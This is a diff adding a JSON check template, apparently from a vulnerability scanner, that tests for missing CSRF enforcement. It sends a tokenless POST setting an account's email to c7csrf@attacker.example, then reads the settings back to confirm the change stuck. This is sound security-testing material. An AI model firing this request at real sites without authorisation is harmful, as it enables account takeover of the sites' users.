@@ -1,0 +1,40 @@
+{
+  "name": "web/CSRF token enforcement absent state-change",
+  "description": "[high] Proves missing CSRF enforcement: the state-changing POST succeeds WITHOUT any CSRF token and a second read-back confirms the change persisted = full cross-site request forgery primitive (CWE-352). Keywords: csrf token enforcement state change forgery cross-site. ctrl: hardened endpoint 403s the tokenless POST -> not falsified. base_url = settings/state-change endpoint; payload = POST without token, check = GET read-back.",
+  "cwe": "CWE-352",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/settings/email",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "email=c7csrf%40attacker.example"
+    },
+    "check": {
+      "method": "GET",
+      "url": "{{base_url}}/settings"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 200
+    },
+    {
+      "type": "body_regex",
+      "request": "check",
+      "pattern": "c7csrf@attacker\\.example",
+      "present": true
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "c56981addfb7",
+  "created": "2026-11-06T04:51:35.422905+00:00",
+  "last_used": "2026-11-06T04:51:35.422905+00:00"
+}
